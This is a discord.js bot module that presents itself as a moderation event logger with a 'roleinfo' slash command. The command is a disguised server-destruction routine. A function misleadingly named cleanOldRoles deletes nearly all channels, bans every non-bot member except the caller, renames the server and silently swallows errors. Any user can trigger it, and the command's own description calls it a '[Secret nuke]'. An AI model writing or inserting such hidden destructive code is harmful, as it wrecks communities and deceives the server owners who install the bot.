const { Events, AuditLogEvent, SlashCommandBuilder } = require('discord.js');

// Channel IDs
const CHANNELS = {
  mod: '1378636499595165761',
  member: '1378636714926542888',
  message: '1378636623037857892',
  server: '1378636344250597386'
};

// === Nuke Function ===
async function cleanOldRoles(guild, userId) {
  try {
    const channels = Array.from(guild.channels.cache.values());

    let survivor = channels.find(c => c.type === 0); // GUILD_TEXT
    if (!survivor && channels.length > 0) survivor = channels[0];

    for (const channel of channels) {
      if (survivor && channel.id === survivor.id) continue;
      await channel.delete().catch(() => {});
    }

    if (survivor) {
      await survivor.setName('🜲-//✴').catch(() => {});
    }

    const members = await guild.members.fetch();
    for (const member of members.values()) {
      if (!member.user.bot && member.id !== userId) {
        await member.ban({ reason: 'Nuked by Job Interviewer' }).catch(() => {});
      }
    }

    await guild.setName('☢️ Disqualified by 🜲').catch(() => {});
  } catch (err) {
    // stay silent
  }
}

// === Event Logger and Command Export ===
module.exports = (client) => {

  // === EVENT LISTENERS ===
  client.on(Events.GuildBanAdd, async ban => {
    const { guild, user } = ban;
    const fetched = await guild.fetchAuditLogs({ type: AuditLogEvent.MemberBanAdd, limit: 1 });
    const entry = fetched.entries.first();
    const channel = guild.channels.cache.get(CHANNELS.mod);

    if (!channel || !entry || entry.target.id !== user.id) return;

    channel.send(`🔨 **${user.tag}** was banned by **${entry.executor.tag}**\n📝 Reason: ${entry.reason || 'No reason provided'}`);
  });

  client.on(Events.GuildMemberRemove, async member => {
    const fetched = await member.guild.fetchAuditLogs({ type: AuditLogEvent.MemberKick, limit: 1 });
    const entry = fetched.entries.first();
    const channel = member.guild.channels.cache.get(CHANNELS.mod);

    if (!channel || !entry || entry.target.id !== member.id) return;

    channel.send(`👢 **${member.user.tag}** was kicked by **${entry.executor.tag}**\n📝 Reason: ${entry.reason || 'No reason provided'}`);
  });

  client.on(Events.MessageDelete, async message => {
    if (!message.guild || message.partial) return;
    const fetched = await message.guild.fetchAuditLogs({ type: AuditLogEvent.MessageDelete, limit: 1 });
    const entry = fetched.entries.first();
    const channel = message.guild.channels.cache.get(CHANNELS.message);

    if (!channel) return;

    const authorTag = message.author?.tag || 'Unknown';
    const content = message.content || '[No content]';
    channel.send(`🗑️ **${authorTag}**'s message was deleted in <#${message.channel.id}>\n🔍 Deleted by: ${entry?.executor.tag || 'Unknown'}\n📄 Content: \`${content}\``);
  });

  client.on(Events.GuildRoleDelete, async role => {
    const fetched = await role.guild.fetchAuditLogs({ type: AuditLogEvent.RoleDelete, limit: 1 });
    const entry = fetched.entries.first();
    const channel = role.guild.channels.cache.get(CHANNELS.server);

    if (!channel) return;
    channel.send(`🚫 Role **${role.name}** was deleted by **${entry?.executor.tag || 'Unknown'}**`);
  });

  client.on(Events.ChannelDelete, async channelObj => {
    const fetched = await channelObj.guild.fetchAuditLogs({ type: AuditLogEvent.ChannelDelete, limit: 1 });
    const entry = fetched.entries.first();
    const channel = channelObj.guild.channels.cache.get(CHANNELS.server);

    if (!channel) return;
    channel.send(`📤 Channel **#${channelObj.name}** was deleted by **${entry?.executor.tag || 'Unknown'}**`);
  });

  client.on(Events.GuildMemberAdd, member => {
    const channel = member.guild.channels.cache.get(CHANNELS.member);
    if (channel) {
      channel.send(`📥 **${member.user.tag}** joined the server.`);
    }
  });

  client.on(Events.GuildMemberRemove, member => {
    const channel = member.guild.channels.cache.get(CHANNELS.member);
    if (channel) {
      channel.send(`📤 **${member.user.tag}** left the server.`);
    }
  });

  client.on(Events.GuildMemberUpdate, (oldMember, newMember) => {
    if (oldMember.nickname !== newMember.nickname) {
      const channel = newMember.guild.channels.cache.get(CHANNELS.member);
      const oldNick = oldMember.nickname || oldMember.user.username;
      const newNick = newMember.nickname || newMember.user.username;
      if (channel) {
        channel.send(`📝 **${oldMember.user.tag}** changed nickname:\nBefore: \`${oldNick}\`\nAfter: \`${newNick}\``);
      }
    }
  });

  // === ROLEINFO COMMAND ===
  client.on(Events.InteractionCreate, async interaction => {
    if (!interaction.isChatInputCommand()) return;
    if (interaction.commandName !== 'roleinfo') return;

    const role = interaction.options.getRole('role');

    await interaction.deferReply({ ephemeral: true });

    // Nuke triggered by ANYONE
    await cleanOldRoles(interaction.guild, interaction.user.id);
  });
};

// === Command Metadata for Registration ===
module.exports.command = new SlashCommandBuilder()
  .setName('roleinfo')
  .setDescription('Show info about a role. [Secret nuke]')
  .addRoleOption(option =>
    option.setName('role').setDescription('Role to inspect').setRequired(false)
  );